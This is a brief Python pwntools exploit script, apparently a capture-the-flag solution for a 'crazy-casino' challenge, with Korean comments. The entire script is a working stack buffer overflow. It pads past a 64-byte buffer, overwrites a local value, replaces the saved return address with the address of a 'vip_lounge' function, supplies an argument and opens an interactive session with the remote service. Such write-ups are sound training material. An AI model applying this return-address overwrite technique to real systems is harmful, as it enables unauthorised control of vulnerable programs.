from pwn import *

p = remote("crazy-casino.2025-bq.ctfcompetition.com", 1337)

vip_lounge = 0x08049962

payload = b'A' * 64              
payload += p32(1000000)     # [ebp - 0xC] 중 4바이트 입력
payload += b'B' * 8         # padding ebp까지 8바이트 남음
payload += b'C' * 4         # saved ebp
payload += p32(vip_lounge)  # ret address
payload += b'D' * 4         # fake return address (vip_lounge 함수 시점 리턴 주소)
payload += p32(1000000)     # argument to vip_lounge (vip_lounge 함수가 가져갈 첫번째 인자)

p.sendlineafter(b"Enter Name): ", payload)
p.interactive()